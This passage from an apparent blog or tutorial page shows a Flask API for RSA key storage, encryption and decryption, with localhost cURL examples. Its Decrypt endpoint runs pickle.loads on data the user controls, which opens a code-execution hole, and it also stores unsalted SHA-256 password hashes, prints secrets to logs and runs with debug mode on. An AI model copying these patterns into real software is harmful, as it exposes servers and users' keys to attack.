+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid token&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;JSON data is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        pubkey_data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;public_key&#39;</span>)
+</span></span><span style="display:flex;"><span>        privkey_data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;private_key&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>        password_hash <span style="color:#f92672">=</span> SHA256<span style="color:#f92672">.</span>new(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> password_hash <span style="color:#f92672">!=</span> users[username][<span style="color:#e6db74">&#39;password&#39;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid password&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> all([pubkey_data, privkey_data, password]):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Key data and/or password is missing.&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            pubkey_bytes <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(pubkey_data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">. Make sure the keys are base64 encoded.&#34;</span>}
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        cipher <span style="color:#f92672">=</span> db_cipher(password_hash)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            privkey_bytes <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(privkey_data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">. Make sure the keys are base64 encoded.&#34;</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            encrypted_privkey <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(privkey_bytes)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74"> while encrypting key. Make sure the key is base64 encoded.&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        users[username][<span style="color:#e6db74">&#39;keys&#39;</span>][<span style="color:#e6db74">&#39;public&#39;</span>]<span style="color:#f92672">.</span>append(pubkey_bytes)
+</span></span><span style="display:flex;"><span>        users[username][<span style="color:#e6db74">&#39;keys&#39;</span>][<span style="color:#e6db74">&#39;private&#39;</span>]<span style="color:#f92672">.</span>append(encrypted_privkey)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[#</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">#]$ - Key uploaded successfully&#34;, &#34;public&#34;: &#34;(b64)</span><span style="color:#e6db74">{</span>base64<span style="color:#f92672">.</span>urlsafe_b64encode(pubkey_bytes)<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;fingerprint&#39;</span>: SHA256<span style="color:#f92672">.</span>new(pubkey_bytes)<span style="color:#f92672">.</span>hexdigest()}, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Encrypt</span>(Resource):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Please use POST request&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>)
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Token is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, JWT_SECRET, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>])
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>InvalidTokenError:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid token&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> password:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Password is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        password_hash <span style="color:#f92672">=</span> SHA256<span style="color:#f92672">.</span>new(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> password_hash <span style="color:#f92672">!=</span> users[username][<span style="color:#e6db74">&#39;password&#39;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid password&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        public_key64 <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;public_key&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> public_key64:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;(Base64)Public key used for encryption is missing.&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            key_data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(public_key64)
+</span></span><span style="display:flex;"><span>            rsakey <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>import_key(key_data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">. Make sure the key is base64 encoded.&#34;</span>}
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        encoded_plaintext <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;data&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;data is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            decoded_plaintext <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(encoded_plaintext)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">. Make sure the data is base64 encoded.&#34;</span>}
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            cipher <span style="color:#f92672">=</span> PKCS1_OAEP<span style="color:#f92672">.</span>new(rsakey)
+</span></span><span style="display:flex;"><span>            encrypted_data <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(decoded_plaintext)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Encryption failed: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}, <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;encrypted_data&#39;</span>: base64<span style="color:#f92672">.</span>urlsafe_b64encode(encrypted_data)<span style="color:#f92672">.</span>decode()}, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Decrypt</span>(Resource):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Please use POST request&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@login_required</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Authorization Token Header is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, JWT_SECRET, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>])
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>InvalidTokenError:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid token&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        encrypted_data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;encrypted_data&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(encrypted_data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> encrypted_data:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Encrypted data is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            decoded_data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(encrypted_data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">. Make sure the data is base64 encoded.&#34;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(password)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> password:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Password is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        password_hash <span style="color:#f92672">=</span> SHA256<span style="color:#f92672">.</span>new(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>        print(password_hash)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> password_hash <span style="color:#f92672">!=</span> users[username][<span style="color:#e6db74">&#39;password&#39;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid password&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            cipher <span style="color:#f92672">=</span> db_cipher(password_hash)
+</span></span><span style="display:flex;"><span>            encrypted_private_key <span style="color:#f92672">=</span> users[username][<span style="color:#e6db74">&#39;keys&#39;</span>][<span style="color:#e6db74">&#39;private&#39;</span>][<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>            decrypted_key_data <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encrypted_private_key)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74"> while decrypting key. Make sure you have uploaded a key pair.&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            private_key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>import_key(decrypted_key_data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74"> while importing key. Make sure you have uploaded a key pair.&#34;</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            rsacipher <span style="color:#f92672">=</span> PKCS1_OAEP<span style="color:#f92672">.</span>new(private_key)
+</span></span><span style="display:flex;"><span>            decrypted_data <span style="color:#f92672">=</span> rsacipher<span style="color:#f92672">.</span>decrypt(decoded_data)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                jsonsafe_plaintext <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(decrypted_data)
+</span></span><span style="display:flex;"><span>                resp <span style="color:#f92672">=</span> jsonsafe_plaintext
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;decrypted_data&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>decrypted_data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;decrypted_data&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;decrypted_data&#39;</span>: jsonsafe_plaintext}, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">.</span>add_resource(Register, <span style="color:#e6db74">&#39;/apiv1/register&#39;</span>)
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">.</span>add_resource(Login, <span style="color:#e6db74">&#39;/apiv1/login&#39;</span>)
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">.</span>add_resource(UploadKey, <span style="color:#e6db74">&#39;/apiv1/uploadkey&#39;</span>)
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">.</span>add_resource(Encrypt, <span style="color:#e6db74">&#39;/apiv1/encrypt&#39;</span>)
+</span></span><span style="display:flex;"><span>api<span style="color:#f92672">.</span>add_resource(Decrypt, <span style="color:#e6db74">&#39;/apiv1/decrypt&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p>Endpoints and Their Functions</p>
+<ul>
+<li>Registration (<code>/apiv1/register</code>):
+<ul>
+<li>Method: POST</li>
+<li>Description: Register a new user with a username and password.
+<code>cURL</code> Example:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>    curl -X POST http://localhost:5000/apiv1/register -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;user1&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Login (<code>/apiv1/login</code>):
+<ul>
+<li>Method: POST</li>
+<li>Description: Login to obtain a token.
+<code>cURL</code> Example:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/login -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Upload Key (<code>/apiv1/uploadkey</code>):
+<ul>
+<li>Method: POST</li>
+<li>Description: Upload a public/private key pair. The private key is encrypted and stored.
+<code>cURL</code> Example:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/uploadkey -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;public_key&#34;:&#34;&lt;base64_pubkey&gt;&#34;, &#34;private_key&#34;:&#34;&lt;base64_privkey&gt;&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Encrypt Data (<code>/apiv1/encrypt</code>):
+<ul>
+<li>Method: POST</li>
+<li>Description: Encrypt data using the uploaded public key.
+<code>cURL</code> Example:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/encrypt -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;public_key&#34;:&#34;&lt;base64_pubkey&gt;&#34;, &#34;data&#34;:&#34;&lt;base64_data&gt;&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Decrypt Data (<code>/apiv1/decrypt</code>):
+<ul>
+<li>Method: POST</li>
+<li>Description: Decrypt data using the stored private key.
+<code>cURL</code> Example:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/decrypt -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;encrypted_data&#34;:&#34;&lt;base64_encrypted_data&gt;&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><p><strong>Source Code Explanation</strong></p>
+<p>Imports and Initial Setup:</p>
+<ul>
+<li>
+<p>Import necessary modules and initialize the Flask app and API.</p>
+</li>
+<li>
+<p>Generate a random JWT secret and initialize a users dictionary.</p>
+</li>
+<li>
+<p><code>db_cipher</code> Class:</p>
+<ul>
+<li>Handles AES encryption and decryption for securely storing private keys.</li>
+</ul>
+</li>
+<li>
+<p><code>login_required</code> Decorator:</p>
+<ul>
+<li>A decorator to enforce JWT authentication on protected endpoints.</li>
+</ul>
+</li>
+<li>
+<p>Register Endpoint:</p>
+<ul>
+<li>Registers a new user, stores hashed passwords, and issues a JWT token.</li>
+</ul>
+</li>
+<li>
+<p>Login Endpoint:</p>
+<ul>
+<li>Authenticates a user using the provided JWT token and password.</li>
+</ul>
+</li>
+<li>
+<p>UploadKey Endpoint:</p>
+<ul>
+<li>Allows logged-in users to upload public and private keys. The private key is encrypted with AES before storing.</li>
+</ul>
+</li>
+<li>
+<p>Encrypt Endpoint:</p>
+<ul>
+<li>Encrypts provided data using the uploaded public key.</li>
+</ul>
+</li>
+<li>
+<p>Decrypt Endpoint:</p>
+<ul>
+<li>Decrypts provided data using the stored private key.</li>
+</ul>
+</li>
+</ul>
+<h4 id="how-to-interact-with-each-endpoint-using-curl">How to Interact with Each Endpoint Using <code>cURL</code></h4>
+<p>Register a New User:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/register -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;user1&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><p>Login:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/login -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><p>Upload Key:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/uploadkey -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;public_key&#34;:&#34;&lt;base64_pubkey&gt;&#34;, &#34;private_key&#34;:&#34;&lt;base64_privkey&gt;&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><p>Encrypt Data:</p>
